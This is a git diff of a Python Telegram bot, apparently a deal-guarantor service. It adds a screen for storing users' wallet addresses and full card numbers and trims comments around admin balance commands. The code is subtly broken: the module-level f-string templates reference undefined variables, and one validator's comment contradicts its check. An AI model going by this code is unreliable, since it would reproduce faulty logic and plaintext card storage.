@@ -2,9 +2,10 @@ import os
 import logging
 import asyncio
 import time
+import re
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
+from aiogram.filters import Command, StateFilter
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -47,6 +48,13 @@ EMOJI_PACKAGE   = '<tg-emoji emoji-id="5794241397217304511">📦</tg-emoji>'
 EMOJI_MEGAPHONE = '<tg-emoji emoji-id="5893290369629556374">📢</tg-emoji>'
 EMOJI_GLOSSARY  = '<tg-emoji emoji-id="5893255507380014983">📖</tg-emoji>'
 
+# Новые для реквизитов
+EMOJI_PIN       = '<tg-emoji emoji-id="5253961389285845297">📌</tg-emoji>'
+EMOJI_DIAMOND   = '<tg-emoji emoji-id="5377620962390857342">💎</tg-emoji>'
+EMOJI_CARD      = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
+EMOJI_STAR      = '<tg-emoji emoji-id="5438496463044752972">⭐️</tg-emoji>'
+EMOJI_COIN      = '<tg-emoji emoji-id="5379773896352355687">🪙</tg-emoji>'
+
 # ============================================================
 # ID ПРЕМИУМ-ЭМОДЗИ ДЛЯ ИНЛАЙН-КНОПОК
 # ============================================================
@@ -62,6 +70,61 @@ CUSTOM_EMOJI_BACK       = "5197269100878907942"
 CUSTOM_EMOJI_SEARCH     = "6084717714847306634"
 CUSTOM_EMOJI_WITHDRAW   = "6041730074376410123"
 CUSTOM_EMOJI_TRANSACT   = "5794241397217304511"
+
+# Новые для кнопок реквизитов
+CUSTOM_EMOJI_TON   = "5301166339749070453"
+CUSTOM_EMOJI_CARD_BTN = "5197434882321567830"
+CUSTOM_EMOJI_STARS_BTN = "5897792062291449826"
+CUSTOM_EMOJI_USDT  = "5474537505015486009"
+CUSTOM_EMOJI_BTC   = "5348296214183950233"
+
+# ---------- FSM для редактирования реквизитов ----------
+class RequisitesEdit(StatesGroup):
+    waiting_ton = State()
+    waiting_card = State()
+    waiting_stars = State()
+    waiting_usdt = State()
+    waiting_btc = State()
+
+# ---------- Хранилище реквизитов пользователей ----------
+user_requisites = {}  # user_id: dict с полями ton, card, stars, usdt, btc, updated_at
+
+def get_user_requisites(user_id: int):
+    return user_requisites.get(user_id, {
+        'ton': '—',
+        'card': '—',
+        'stars': '—',
+        'usdt': '—',
+        'btc': '—',
+        'updated_at': None
+    })
+
+def save_user_requisites(user_id: int, data: dict):
+    if user_id not in user_requisites:
+        user_requisites[user_id] = {}
+    user_requisites[user_id].update(data)
+    user_requisites[user_id]['updated_at'] = datetime.now().strftime("%H:%M")
+
+# ---------- Валидация ----------
+def validate_ton(value: str) -> bool:
+    # упрощённо: не пусто и длина > 10
+    return len(value.strip()) > 5
+
+def validate_card(value: str) -> bool:
+    # 16 цифр
+    return bool(re.fullmatch(r'\d{16}', value.strip()))
+
+def validate_stars(value: str) -> bool:
+    # начинается с @, содержит буквы, цифры, подчёркивание
+    return bool(re.fullmatch(r'@[\w_]+', value.strip()))
+
+def validate_usdt(value: str) -> bool:
+    # TRC20 адрес: длина 34, начинается с T
+    return bool(re.fullmatch(r'T[1-9A-HJ-NP-Za-km-z]{33}', value.strip()))
+
+def validate_btc(value: str) -> bool:
+    # упрощённо: длина > 25
+    return len(value.strip()) > 25
 
 # ---------- Тексты ----------
 REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=ref{user_id}"
@@ -163,6 +226,31 @@ TEXTS = {
         'logs_entry': "{time} | {user} | {action} | {data}",
         'temporarily_unavailable': f"{EMOJI_PACKAGE} Функция временно недоступна. Скоро появится!",
         'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n@boyfrer",
+        # ---------- Реквизиты ----------
+        'requisites_title': f"{EMOJI_PIN} <b>Мои реквизиты</b>",
+        'requisites_body': (
+            f"<blockquote>{EMOJI_DIAMOND} <b>TON-кошелёк:</b>\n"
+            f"<code>{ton}</code>\n\n"
+            f"{EMOJI_CARD} <b>Карта:</b>\n"
+            f"<code>{card}</code>\n\n"
+            f"{EMOJI_STAR} <b>Stars:</b>\n"
+            f"<code>{stars}</code>\n\n"
+            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
+            f"<code>{usdt}</code>\n\n"
+            f"{EMOJI_COIN} <b>BTC:</b>\n"
+            f"<code>{btc}</code></blockquote>\n\n"
+            f"<i>изменено {time}</i>"
+        ),
+        'requisites_buttons': {
+            'ton': f"{EMOJI_DIAMOND} TON-кошелёк",
+            'card': f"{EMOJI_CARD} Карта",
+            'stars': f"{EMOJI_STAR} Stars",
+            'usdt': f"{EMOJI_MONEY} USDT-кошелёк",
+            'btc': f"{EMOJI_COIN} BTC-кошелёк"
+        },
+        'requisites_edit_prompt': "Введите новый {field}:",
+        'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
+        'requisites_edit_success': "Данные обновлены!",
     },
     'en': {
         'welcome': (
@@ -260,6 +348,31 @@ TEXTS = {
         'logs_entry': "{time} | {user} | {action} | {data}",
         'temporarily_unavailable': f"{EMOJI_PACKAGE} Feature temporarily unavailable. Coming soon!",
         'support_contact': f"{EMOJI_SHIELD} Support\n\nContact our manager:\n@boyfrer",
+        # ---------- Requisites ----------
+        'requisites_title': f"{EMOJI_PIN} <b>My requisites</b>",
+        'requisites_body': (
+            f"<blockquote>{EMOJI_DIAMOND} <b>TON wallet:</b>\n"
+            f"<code>{ton}</code>\n\n"
+            f"{EMOJI_CARD} <b>Card:</b>\n"
+            f"<code>{card}</code>\n\n"
+            f"{EMOJI_STAR} <b>Stars:</b>\n"
+            f"<code>{stars}</code>\n\n"
+            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
+            f"<code>{usdt}</code>\n\n"
+            f"{EMOJI_COIN} <b>BTC:</b>\n"
+            f"<code>{btc}</code></blockquote>\n\n"
+            f"<i>changed {time}</i>"
+        ),
+        'requisites_buttons': {
+            'ton': f"{EMOJI_DIAMOND} TON wallet",
+            'card': f"{EMOJI_CARD} Card",
+            'stars': f"{EMOJI_STAR} Stars",
+            'usdt': f"{EMOJI_MONEY} USDT wallet",
+            'btc': f"{EMOJI_COIN} BTC wallet"
+        },
+        'requisites_edit_prompt': "Enter new {field}:",
+        'requisites_edit_invalid': "Invalid format. Try again.",
+        'requisites_edit_success': "Data updated!",
     }
 }
 
@@ -455,17 +568,6 @@ async def cb_back_to_menu(callback: types.CallbackQuery):
     await callback.answer()
 
 # ---------- Остальные кнопки (заглушки) ----------
-@dp.callback_query(lambda c: c.data == "requisites")
-async def cb_requisites(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    text = f"{EMOJI_MONEY} Реквизиты: карта ****, BTC..." if user_lang.get(user_id, 'ru') == 'ru' else f"{EMOJI_MONEY} Requisites: card ****, BTC..."
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
-    log_action(user_id, "requisites", "просмотр реквизитов")
-
 @dp.callback_query(lambda c: c.data == "create")
 async def cb_create(callback: types.CallbackQuery):
     user_id = callback.from_user.id
@@ -477,7 +579,179 @@ async def cb_create(callback: types.CallbackQuery):
     await callback.answer()
     log_action(user_id, "create_deal", "создание сделки (заглушка)")
 
-# ---------- Админ-панель (только текст) ----------
+# ============================================================
+# МОИ РЕКВИЗИТЫ
+# ============================================================
+
+# ---------- Отображение реквизитов ----------
+async def show_requisites(target, user_id: int):
+    req = get_user_requisites(user_id)
+    ton = req['ton']
+    card = req['card']
+    stars = req['stars']
+    usdt = req['usdt']
+    btc = req['btc']
+    updated = req['updated_at'] if req['updated_at'] else 'никогда'
+    
+    title = get_text(user_id, 'requisites_title')
+    body = get_text(user_id, 'requisites_body').format(
+        ton=ton, card=card, stars=stars, usdt=usdt, btc=btc, time=updated
+    )
+    text = f"{title}\n\n{body}"
+    
+    # Клавиатура с кнопками для каждого поля
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'requisites_buttons')['ton'],
+                icon_custom_emoji_id=CUSTOM_EMOJI_TON,
+                callback_data="edit_ton"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'requisites_buttons')['card'],
+                icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN,
+                callback_data="edit_card"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'requisites_buttons')['stars'],
+                icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN,
+                callback_data="edit_stars"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'requisites_buttons')['usdt'],
+                icon_custom_emoji_id=CUSTOM_EMOJI_USDT,
+                callback_data="edit_usdt"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'requisites_buttons')['btc'],
+                icon_custom_emoji_id=CUSTOM_EMOJI_BTC,
+                callback_data="edit_btc"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text=get_text(user_id, 'back_btn'),
+                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
+                callback_data="back_to_menu"
+            )
+        ]
+    ])
+    await send_with_banner(target, text, keyboard)
+
+@dp.callback_query(lambda c: c.data == "requisites")
+async def cb_requisites(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    await show_requisites(callback, user_id)
+    await callback.answer()
+
+# ---------- Редактирование полей (FSM) ----------
+# Для каждого поля создаём отдельный обработчик callback, который запускает состояние
+
+@dp.callback_query(lambda c: c.data == "edit_ton")
+async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    await state.set_state(RequisitesEdit.waiting_ton)
+    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="TON-кошелёк"))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "edit_card")
+async def edit_card(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    await state.set_state(RequisitesEdit.waiting_card)
+    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="карта (16 цифр)"))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "edit_stars")
+async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    await state.set_state(RequisitesEdit.waiting_stars)
+    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="Stars (@username)"))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "edit_usdt")
+async def edit_usdt(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    await state.set_state(RequisitesEdit.waiting_usdt)
+    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="USDT (TRC20 адрес)"))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "edit_btc")
+async def edit_btc(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    await state.set_state(RequisitesEdit.waiting_btc)
+    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="BTC-адрес"))
+    await callback.answer()
+
+# ---------- Обработчики ввода для каждого состояния ----------
+@dp.message(RequisitesEdit.waiting_ton)
+async def process_ton(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    value = message.text.strip()
+    if not validate_ton(value):
+        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
+        return
+    save_user_requisites(user_id, {'ton': value})
+    await state.clear()
+    await show_requisites(message, user_id)
+    log_action(user_id, "edit_requisites", f"ton обновлён")
+
+@dp.message(RequisitesEdit.waiting_card)
+async def process_card(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    value = message.text.strip()
+    if not validate_card(value):
+        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
+        return
+    save_user_requisites(user_id, {'card': value})
+    await state.clear()
+    await show_requisites(message, user_id)
+    log_action(user_id, "edit_requisites", f"card обновлён")
+
+@dp.message(RequisitesEdit.waiting_stars)
+async def process_stars(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    value = message.text.strip()
+    if not validate_stars(value):
+        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
+        return
+    save_user_requisites(user_id, {'stars': value})
+    await state.clear()
+    await show_requisites(message, user_id)
+    log_action(user_id, "edit_requisites", f"stars обновлён")
+
+@dp.message(RequisitesEdit.waiting_usdt)
+async def process_usdt(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    value = message.text.strip()
+    if not validate_usdt(value):
+        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
+        return
+    save_user_requisites(user_id, {'usdt': value})
+    await state.clear()
+    await show_requisites(message, user_id)
+    log_action(user_id, "edit_requisites", f"usdt обновлён")
+
+@dp.message(RequisitesEdit.waiting_btc)
+async def process_btc(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    value = message.text.strip()
+    if not validate_btc(value):
+        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
+        return
+    save_user_requisites(user_id, {'btc': value})
+    await state.clear()
+    await show_requisites(message, user_id)
+    log_action(user_id, "edit_requisites", f"btc обновлён")
+
+# ---------- Админ-панель ----------
 ADMIN_ID = 8297446667
 
 @dp.message(Command("hyteam"))
@@ -486,11 +760,9 @@ async def cmd_hyteam(message: types.Message):
     if not is_admin(user_id):
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
-    # Отправляем только текст админ-панели без инлайн-кнопок
     await send_with_banner(message, get_text(user_id, 'admin_panel'))
     log_action(user_id, "hyteam", "открытие админ-панели")
 
-# ---------- Команда накрутки баланса ----------
 @dp.message(Command("addbalance"))
 async def cmd_addbalance(message: types.Message):
     user_id = message.from_user.id
@@ -519,7 +791,6 @@ async def cmd_addbalance(message: types.Message):
     ))
     log_action(user_id, "addbalance", f"пользователю {target_user_id} +{amount} TON")
 
-# ---------- Остальные админ-команды (без кнопок) ----------
 @dp.message(Command("vvteam"))
 async def cmd_vvteam(message: types.Message):
     user_id = message.from_user.id
@@ -538,7 +809,6 @@ async def cmd_vvteam(message: types.Message):
         await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
         return
     text = get_text(user_id, 'admin_withdraw_list').format(list=list_text)
-    # Добавим кнопку обновить (инлайн) – оставляем только для удобства обновления списка
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]
     ])
